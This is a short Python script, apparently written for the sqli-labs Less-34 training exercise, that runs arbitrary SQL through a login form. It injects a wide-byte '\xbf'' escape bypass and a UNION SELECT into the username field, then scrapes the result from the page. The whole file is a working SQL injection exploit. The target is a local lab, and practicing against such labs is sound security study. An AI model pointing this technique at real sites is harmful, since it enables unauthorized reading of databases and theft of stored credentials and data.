#!/usr/bin/env python

import base64
import requests
import re
import string
import sys
import time
import urllib

banner = '''
USAGE: python %s <SQL Query>

EXAMPLE: python %s "SELECT table_schema FROM information_schema.tables limit 0,1"
''' % (sys.argv[0], sys.argv[0])

if(len(sys.argv) != 2):
    print(banner)
    exit(0)
else:
    pass

sourcestr = string.printable
url = "http://172.16.214.227/sqli-labs/Less-34/"
pattern = r'Your Login name:[^<]+'
query = "\xbf' union select (" + sys.argv[1] + "),3-- "
result = ""

header = {
    "User-Agent": "Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0",
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "close",
}

data = {
    "uname": query,
    "passwd": "test",
    "submit": "Submit"
}

print("[*] Query: %s" % data)

res = requests.post(url, headers=header, data=data, verify=False)
resbody = str(res.text.encode('utf-8')).lstrip("b").strip("'")
resbody = re.sub(r"\\t", "\t", resbody)
resbody = re.sub(r"\\r", "", resbody)
resbody = re.sub(r"\\\'", "\'", resbody)
resbody = re.sub(r"\\\"", "\"", resbody)
resbody = re.sub(r"\\n", "\n", resbody).strip()

try:
    result = re.search(pattern, resbody).group(0).split(':')[1]
except:
    result = "***NO RESULT***"

print("[*] RESULT: %s" % result)
